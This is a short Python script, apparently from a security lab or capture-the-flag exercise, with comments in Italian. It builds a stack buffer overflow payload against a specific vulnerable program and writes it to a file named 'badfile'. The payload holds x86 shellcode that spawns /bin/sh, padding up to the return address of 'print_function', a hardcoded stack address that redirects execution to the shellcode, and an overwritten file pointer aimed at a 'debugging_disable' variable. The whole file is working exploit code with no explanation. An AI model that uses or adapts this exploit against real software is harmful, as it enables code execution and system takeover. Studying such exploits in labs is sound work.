# coding=utf-8
import struct

debugging_disable = 0x0804a030
dst = 0xbffff4d0
offset = 116

shellcode=(b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")

payload = shellcode
payload += "A"*(offset-len(shellcode)) 			# padding per arrivare al return address di print_function
payload += struct.pack("I",dst) 				# Il return address di print_function punta a dst

payload += "C"*(260-len(payload)) 				# padding per str
payload += struct.pack("I",debugging_disable)   # fp punta alla variabile debugging_disable

f = open("badfile", "w")
f.write("%s"%payload) 
f.close()